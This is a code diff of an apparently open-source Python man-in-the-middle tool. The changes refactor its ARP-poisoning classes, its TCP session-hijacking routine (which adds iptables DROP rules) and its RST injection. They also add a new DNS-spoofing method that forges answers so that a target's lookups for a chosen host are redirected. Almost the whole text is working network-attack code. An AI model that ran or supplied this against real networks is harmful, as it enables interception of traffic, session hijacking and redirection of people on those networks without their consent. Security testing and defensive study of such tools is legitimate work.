@@ -20,13 +20,12 @@
 import os
 import re
 import sys
-import struct
 import time
 import logging as log
-from socket import socket, inet_ntoa, gethostbyname, PF_PACKET, SOCK_RAW
+from socket import socket, inet_ntoa, inet_aton, gethostbyname, PF_PACKET, SOCK_RAW
 from threading import Thread
 try:
-    from scapy.all import ARP, send, conf, sniff, TCP, UDP, DNS, DNSQR, IP, sr1, DNSRR, Ether
+    from scapy.all import ARP, IP, UDP, DNS, DNSRR, conf, send
     conf.verb = 0
 except ImportError:
     print("[!] Missing module scapy, try setting SCAPY to False in config.py "
@@ -46,7 +45,7 @@ try:
 except ImportError:
     print("[!] Missing module dnet, DNS spoofing (-2 options) won't work")
 import creak.utils as utils
-import creak.config as config
+
 
 (G, W, R) = (utils.G, utils.W, utils.R)
 
@@ -55,11 +54,13 @@ class Mitm(object):
     Base abstract class for Man In The Middle attacks, poison and restore are
     left unimplemented
     """
-    def __init__(self, device, source_mac, gateway, target):
+    def __init__(self, device, source_mac, gateway, target, debug, verbose):
         self.dev = device
         self.src_mac = source_mac
         self.gateway = gateway
         self.target = target
+        self.debug = debug
+        self.verbose = verbose
         self.sessions = []
 
     def _build_pcap_filter(self, prefix, port=None):
@@ -106,7 +107,7 @@ class Mitm(object):
             print('[+] Sending RST packets to ' + R
                   + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)
 
-        if config.DOTTED is True:
+        if self.verbose:
             print('[+] Every dot symbolize a sent packet')
 
         counter = 0
@@ -150,7 +151,7 @@ class Mitm(object):
 
                         sock.send(str(eth_layer))
 
-                        if config.DOTTED is True:
+                        if self.verbose:
                             utils.print_in_line('.')
                         else:
                             utils.print_counter(counter)
@@ -163,7 +164,7 @@ class Mitm(object):
 
                         sock.send(str(eth_layer))
 
-                        if config.DOTTED is True:
+                        if self.verbose:
                             utils.print_in_line('.')
                         else:
                             utils.print_counter(counter)
@@ -327,7 +328,8 @@ class Mitm(object):
         if not target_b:
             target_b = self.gateway
         print('[+] Sessions between {}{}{} and {}{}{} will be listed soon,\n'
-              '    just type the number of session to hijack and ENTER\n'.format(G, self.target, W, G, target_b, W))
+              '    just type the number of session to hijack and ENTER\n'.format(G, self.target,
+                                                                                 W, G, target_b, W))
         stop_thread = False
         list_conn_thread = Thread(target=self.list_sessions, args=(lambda: stop_thread, target_b, ))
         list_conn_thread.start()
@@ -342,9 +344,11 @@ class Mitm(object):
         # must stop thread
         stop_thread = True
         list_conn_thread.join()
-        src_ip, src_port, dst_ip, dst_port = re.search(r'^([0-9.]+):(\d+)\s+<->\s+([0-9.]+):(\d+)$', self.sessions[choice]).groups()
+        src_ip, src_port, dst_ip, dst_port = re.search(r'^([0-9.]+):(\d+)\s+<->\s+([0-9.]+):(\d+)$',
+                                                       self.sessions[choice]).groups()
         str_src_ip, str_src_port, str_dst_ip, str_dst_port = src_ip, src_port, dst_ip, dst_port
-        print('\n[*] Trying an hijack for: {}:{} --> {}:{}'.format(src_ip, src_port, dst_ip, dst_port))
+        print('\n[*] Trying an hijack for: {}:{} --> {}:{}'.format(src_ip,
+                                                                   src_port, dst_ip, dst_port))
         print('\n[*] Waiting for another packet in order to get a seq and a ack number')
         pcap_filter = 'src host %s and src port %s and dst host %s and dst port %s and tcp' % (src_ip, src_port, dst_ip, dst_port)
         packets = pcap.pcap(self.dev)
@@ -425,8 +429,8 @@ class Mitm(object):
         tcpdaemon_thread = Thread(target=response_to, args=(ack,))
         tcpdaemon_thread.daemon = True
         tcpdaemon_thread.start()
-        os.system('/sbin/iptables -A FORWARD -s %s -p tcp --sport %s -j DROP' % (str_src_ip, str_src_port));
-        os.system('/sbin/iptables -A FORWARD -d %s -p tcp --dport %s -j DROP' % (str_src_ip, str_src_port));
+        os.system('/sbin/iptables -A FORWARD -s %s -p tcp --sport %s -j DROP' % (str_src_ip, str_src_port))
+        os.system('/sbin/iptables -A FORWARD -d %s -p tcp --dport %s -j DROP' % (str_src_ip, str_src_port))
         print('[*] Session hijacked, everything entered now should be sent through it.')
 
         # start a command loop to send instruction to the hijacked session
@@ -473,8 +477,9 @@ class PcapMitm(Mitm):
     """
     Man In The Middle subclass using raw sockets to poison the targets
     """
-    def __init__(self, device, source_mac, gateway, target):
-        super(PcapMitm, self).__init__(device, source_mac, gateway, target)
+    def __init__(self, device, source_mac, gateway, target, debug, verbose):
+        super(PcapMitm, self).__init__(device, source_mac, gateway, target,
+                                       debug, verbose)
 
     def poison(self, delay, target_b=None):
         """
@@ -488,7 +493,7 @@ class PcapMitm(Mitm):
         sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
         try:
             while True:
-                if config.VERBOSE is True:
+                if self.debug:
                     log.info('[+] %s <-- %s -- %s -- %s --> %s',
                              target_b, self.target, self.dev, target_b, self.target)
                     if not isinstance(self.target, list):
@@ -531,36 +536,122 @@ class ScapyMitm(Mitm):
     Man In The Middle subclass using scapy to poison the target, needs tcpdump to be
     installed
     """
-    def __init__(self, device, source_mac, gateway, target):
-        super(ScapyMitm, self).__init__(device, source_mac, gateway, target)
+    def __init__(self, device, source_mac, gateway, target, debug, verbose):
+        super(ScapyMitm, self).__init__(device, source_mac, gateway, target,
+                                        debug, verbose)
 
     def poison(self, delay, target_b=None):
         if not target_b:
             target_b = self.gateway
+        src_mac = ':'.join(a+b for a, b in zip(self.src_mac[::2], self.src_mac[1::2]))
         if not isinstance(self.target, list):
-            dst_mac = utils.get_mac_by_ip_s(self.target, delay)
+            dst_mac = utils.get_mac_by_ip(self.target)
             send(ARP(op=2, pdst=self.target, psrc=target_b, hwdst=dst_mac), verbose=False)
-            send(ARP(op=2, pdst=target_b, psrc=self.target, hwdst=self.src_mac), verbose=False)
+            send(ARP(op=2, pdst=target_b, psrc=self.target, hwdst=src_mac), verbose=False)
         else:
             for addr in self.target:
-                dst_mac = utils.get_mac_by_ip_s(addr, delay)
+                dst_mac = utils.get_mac_by_ip(addr)
                 send(ARP(op=2, pdst=addr, psrc=target_b, hwdst=dst_mac), verbose=False)
-                send(ARP(op=2, pdst=target_b, psrc=addr, hwdst=self.src_mac), verbose=False)
+                send(ARP(op=2, pdst=target_b, psrc=addr, hwdst=src_mac), verbose=False)
 
     def restore(self, delay, target_b=None):
         if not target_b:
             target_b = self.gateway
+        src_mac = ':'.join(a+b for a, b in zip(self.src_mac[::2], self.src_mac[1::2]))
         if not isinstance(self.target, list):
-            dst_mac = utils.get_mac_by_ip_s(self.target, delay)
+            dst_mac = utils.get_mac_by_ip(self.target)
             send(ARP(op=2, pdst=target_b, psrc=self.target,
                      hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
             send(ARP(op=2, pdst=self.target, psrc=target_b,
-                     hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
+                     hwdst="ff:" * 5 + "ff", hwsrc=src_mac), count=3, verbose=False)
         else:
             for addr in self.target:
-                dst_mac = utils.get_mac_by_ip_s(addr, delay)
+                dst_mac = utils.get_mac_by_ip(addr)
                 send(ARP(op=2, pdst=target_b, psrc=addr,
                          hwdst="ff:" * 5 + "ff", hwsrc=dst_mac), count=3, verbose=False)
                 send(ARP(op=2, pdst=addr, psrc=target_b,
-                         hwdst="ff:" * 5 + "ff", hwsrc=self.src_mac), count=3, verbose=False)
+                         hwdst="ff:" * 5 + "ff", hwsrc=src_mac), count=3, verbose=False)
+
+    def dns_spoof(self, host=None, redirection=None):
+        """
+        Redirect all incoming request for 'host' to 'redirection'
+        """
+        pcap_filter = self._build_pcap_filter('udp dst port 53 and src ')
+        redirection = gethostbyname(redirection)
+
+        print('[+] Start poisoning on ' + G + self.dev + W + ' between ' + G + self.gateway + W
+              + ' and ' + R
+              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W +'\n')
+        # need to create a daemon that continually poison our target
+        poison_thread = Thread(target=self.poison, args=(2, ))
+        poison_thread.daemon = True
+        poison_thread.start()
+
+        packets = pcap.pcap(self.dev)
+        packets.setfilter(pcap_filter)
+
+        sock = socket(PF_PACKET, SOCK_RAW)
+        sock.bind((self.dev, dpkt.ethernet.ETH_TYPE_ARP))
+
+        print('[+] Redirecting ' + G + host + W + ' to ' + G + redirection + W + ' for ' + R
+              + (','.join(self.target) if isinstance(self.target, list) else self.target) + W)
+
+        try:
+            for _, pkt in packets:
+                eth = dpkt.ethernet.Ethernet(pkt)
+                ip_packet = eth.data
+                udp = ip_packet.data
+                dns = dpkt.dns.DNS(udp.data)
+                # validate query
+                if dns.qr != dpkt.dns.DNS_Q:
+                    continue
+                if dns.opcode != dpkt.dns.DNS_QUERY:
+                    continue
+                if len(dns.qd) != 1:
+                    continue
+                if len(dns.an) != 0:
+                    continue
+                if len(dns.ns) != 0:
+                    continue
+                if dns.qd[0].cls != dpkt.dns.DNS_IN:
+                    continue
+                if dns.qd[0].type != dpkt.dns.DNS_A:
+                    continue
+                # spoof for our target name
+                if dns.qd[0].name != host:
+                    continue
+                # send spoofed answer
+                send(IP(src=inet_ntoa(ip_packet.dst), dst=inet_ntoa(ip_packet.src))/
+                     UDP(sport=udp.dport, dport=udp.sport)/
+                     DNS(opcode=dpkt.dns.DNS_RA, rcode=dpkt.dns.DNS_RCODE_NOERR,
+                         qr=dpkt.dns.DNS_R, an=DNSRR(rrname=host, type=dpkt.dns.DNS_A,
+                                                     rclass=dpkt.dns.DNS_IN,
+                                                     rdata=redirection)))
+                # dns query->response
+                # dns.op = dpkt.dns.DNS_RA
+                # dns.rcode = dpkt.dns.DNS_RCODE_NOERR
+                # dns.qr = dpkt.dns.DNS_R
+                #
+                # # construct fake answer
+                # arr = dpkt.dns.DNS.RR()
+                # arr.cls, arr.type, arr.name = dpkt.dns.DNS_IN, dpkt.dns.DNS_A, host
+                # # arr.ip = dnet.addr(redirection).ip
+                # arr.ip = socket.inet_aton(redirection)
+                #
+                # dns.an.append(arr)
+                #
+                # udp.sport, udp.dport = udp.dport, udp.sport
+                # ip_packet.src, ip_packet.dst = ip_packet.dst, ip_packet.src
+                # udp.data, udp.ulen = dns, len(udp)
+                # ip_packet.len = len(ip_packet)
+                #
+                #
+                # sock.send(str(ip_packet))
+
+                print(inet_ntoa(ip_packet.dst))
+
+        except KeyboardInterrupt:
+            print('[+] DNS spoofing interrupted\n\r')
+            self.restore(2)
+            utils.set_ip_forward(0)
 
